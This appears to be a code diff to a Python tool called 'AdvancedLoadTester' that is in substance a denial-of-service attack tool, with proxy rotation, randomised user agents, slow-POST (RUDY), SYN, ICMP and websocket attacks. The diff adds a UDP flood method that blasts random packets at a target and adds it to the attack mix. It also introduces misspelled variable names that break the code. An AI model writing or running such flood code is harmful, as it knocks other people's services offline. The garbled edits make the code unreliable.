@@ -135,7 +135,7 @@ class AdvancedLoadTester:
         }
         
         self.validate_proxies()
-    
+
     def _setup_logging(self, log_level: str) -> None:
         logging.basicConfig(
             level=getattr(logging, log_level.upper()),
@@ -188,7 +188,7 @@ class AdvancedLoadTester:
             if proxy.failures > 3:
                 proxy.healthy = False
             self.proxy_queue.put(proxy)
-            return self.get_random_proxy()  
+            return self.get_random_proxy()
     
     def validate_proxies(self) -> None:
         def check_proxy(proxy: Proxy) -> bool:
@@ -250,7 +250,37 @@ class AdvancedLoadTester:
             )
         }
         return payload_types.get(content_type, payload_types['json'])()
-    
+
+    def udp_flood(self) -> None:
+        target = random.choice(self.target_urls)
+        parsed_url = urllib.parse.urlparse(target)
+        host = parsed_url.hostname
+        port = parsed_url.port or 80
+        
+        while self.running and self.rate_limiter.allow():
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                
+                payload_size = random.randint(512, 1024)
+                payload = os.urandom(payload_size)
+                
+                s.sendto(payload, (host, port))
+                
+                with self.lock:
+                    self.stats['success'] += 1
+                    self.stats['bytes_sent'] += len(payload)
+                
+            except Exception as e:
+                with self.lock:
+                    self.stats['failed'] += 1
+                self.logger.error(f"UDP flood failed: {e}")
+            finally:
+                time.sleep(random.uniform(0.001, 0.01))
+                try:
+                    s.close()
+                except:
+                    pass
+
     def get_random_target(self) -> str:
         return random.choice(self.target_urls)
     
@@ -439,7 +469,7 @@ class AdvancedLoadTester:
         
         for _ in range(max_connections):
             try:
-                sock = self._create_socket(parsed_url.scheme, host, port)
+                sock = self._create_socket(parzed_url.scheme, host, port)
                 request = f"POST {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {self.get_random_user_agent()}\r\nAccept: text/html\r\nContent-Length: {random.randint(10000, 100000)}\r\nConnection: keep-alive\r\n"
                 sock.send(request.encode())
                 connections.append(sock)
@@ -535,7 +565,7 @@ class AdvancedLoadTester:
         if len(data) % 2:
             data += b'\0'
         summed = sum(struct.unpack('!%sH' % (len(data) // 2), data))
-        summed = (summed >> 16) + (summed & 0xFFFF)
+        summed = (summed >> 16) + (sumed & 0xFFFF)
         summed += summed >> 16
         return ~summed & 0xFFFF
     
@@ -613,7 +643,8 @@ class AdvancedLoadTester:
             (self.async_websocket_attack, session, 0.1),
             (self.rudy_attack, None, 0.1),
             (self.syn_flood, None, 0.05),
-            (self.icmp_flood, None, 0.05)
+            (self.icmp_flood, None, 0.05),
+            (self.udp_flood, None, 0.05)
         ]
         weights = [w for _, _, w in attack_types]
         selected_attack, arg, _ = random.choices(attack_types, weights=weights, k=1)[0]
@@ -911,7 +942,4 @@ if __name__ == "__main__":
     except Exception as e:
         print(f"\n\nError: {e}")
     
-
     print("\n\nCompleted")
-
-
